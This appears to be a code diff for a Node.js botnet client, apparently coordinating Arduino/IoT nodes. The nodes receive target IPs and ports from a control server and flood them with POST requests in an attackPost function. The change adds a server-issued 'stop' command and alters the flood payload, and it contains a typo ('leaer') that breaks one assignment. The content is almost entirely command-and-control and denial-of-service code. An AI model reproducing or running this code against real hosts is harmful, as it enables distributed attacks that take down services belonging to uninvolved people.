@@ -131,16 +131,25 @@ function postIOT(){
                 //console.log(body);
             if(body != "ok")
             {   
-                setTimeout(function(){
-                console.log("ARDUINOS");
-                arduinos = body.arduinos;
-                console.log(arduinos);
-                console.log("TARGETS");
-                attackInfo = body.targets;
-                console.log(attackInfo);
-                length = arduinos.length;
-                setLeader();
-                }, 1000);
+                if(body == "stop")
+                {
+                    attack = false;
+                    posts = 1;
+                    leaer = true;
+                }
+                else
+                {
+                    setTimeout(function(){
+                    console.log("ARDUINOS");
+                    arduinos = body.arduinos;
+                    console.log(arduinos);
+                    console.log("TARGETS");
+                    attackInfo = body.targets;
+                    console.log(attackInfo);
+                    length = arduinos.length;
+                    setLeader();
+                    }, 1000);
+                }
             }
             })); 
 };
@@ -251,20 +260,14 @@ function startAttack(){
 //Attackpost para atacar a la ip designada
 function attackPost(){
         console.log("Attacking");
-        console.log(attackInfo.ips[0])
-        console.log(attackInfo.ports[0])
-        var time = getDateTime();
-        var val1 = Math.floor((Math.random() * 200) - 100);
-        var val2 = Math.floor((Math.random() * 200) - 100);
-
-        data.datetime = "\"" + time + "\"";
-        data.data = {'sensor0':val1, 'sensor1':val2};
+        //console.log(attackInfo.ips[0])
+        //console.log(attackInfo.ports[0])
         
         (request({
         url: "http://" + attackInfo.ips[attacking] + ":" + attackInfo.ports[attacking] + "/",
         method: "POST",
         json: true,   // <--Very important!!!
-        body: data
+        body: info
         }, function (error, response, body){
         //Ignore the response    
         })); 
